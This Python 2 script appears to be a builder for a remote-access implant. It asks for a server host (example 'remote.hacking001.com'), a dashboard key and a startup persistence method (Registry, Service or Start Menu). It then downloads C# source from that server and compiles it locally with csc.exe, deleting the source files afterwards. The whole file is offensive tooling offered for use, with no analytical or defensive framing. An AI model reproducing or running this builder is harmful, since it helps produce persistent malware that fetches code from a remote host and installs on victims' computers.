# -*- coding: utf-8 -*-
import requests, sys, os

print 'enter you server host, likes https://remote.hacking001.com .'
ServerHost = raw_input('Please enter your server host > ')
print ''

print 'enter you SEC key, from dashboard to get.'
SEC = raw_input('Please enter your SEC > ')
print ''

print 'enter you Enviroments.'
print 'enter Developer to get dev\'s version.'
print 'enter Production to get production version.'
ENV = raw_input('Please enter ENV > ')
print ''

print 'enter what\'s startup function, you want.'
print 'enter Registry to get reg function.'
print 'enter Service to get service startup function.'
print 'enter Startup to get Start Memu startup function.'
RUN = raw_input('Please enter RUN > ')
print ''

print 'All rights, that will need internet to connect to server get code.'
print 'waiting...'
print ''

try:
	data = {
		'SH': ServerHost,
		'SEC': SEC,
		'ENV': ENV,
		'RUN': RUN,
	}
	csharp_program_code = requests.post(ServerHost + '/Install/GetCsharpCode/Program', data = data, timeout = 10)
	csharp_simplejson_code = requests.get(ServerHost + '/Install/GetCsharpCode/SimpleJson', timeout = 10)
except:
	print 'error. connect to your enter server failed.'
	print 'please re try.'
	sys.exit(0)
else:
	open('Program.cs', 'wb').write(csharp_program_code.content)
	open('SimpleJson.cs', 'wb').write(csharp_simplejson_code.content)
	os.system('C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe Program.cs SimpleJson.cs')
	print 'if not alert errors, compiler was done.'
	print ''
finally:
	os.remove('Program.cs')
	os.remove('SimpleJson.cs')
	os.system('pause')
	sys.exit(0)